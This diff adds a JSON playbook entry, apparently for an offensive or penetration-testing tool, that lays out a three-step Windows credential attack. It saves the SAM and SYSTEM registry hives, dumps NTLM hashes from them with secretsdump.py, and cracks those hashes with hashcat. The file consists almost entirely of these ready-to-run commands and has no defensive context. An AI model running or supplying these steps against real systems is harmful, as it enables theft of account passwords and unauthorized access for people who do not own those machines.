@@ -1,0 +1,25 @@
+{
+	"name": "NTLM Hash Cracking",
+	"description": "Recover plaintext from captured NTLM hashes.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Extract from SAM",
+			"command": "reg save HKLM\\SAM sam; reg save HKLM\\SYSTEM system",
+			"description": "Dump hives."
+		},
+		{
+			"index": 2,
+			"name": "secretsdump",
+			"command": "secretsdump.py -sam sam -system system LOCAL",
+			"description": "Extract NTLM hashes."
+		},
+		{
+			"index": 3,
+			"name": "Hashcat",
+			"command": "hashcat -m 1000 hashes.txt wordlist.txt",
+			"description": "Crack NTLM."
+		}
+	]
+}
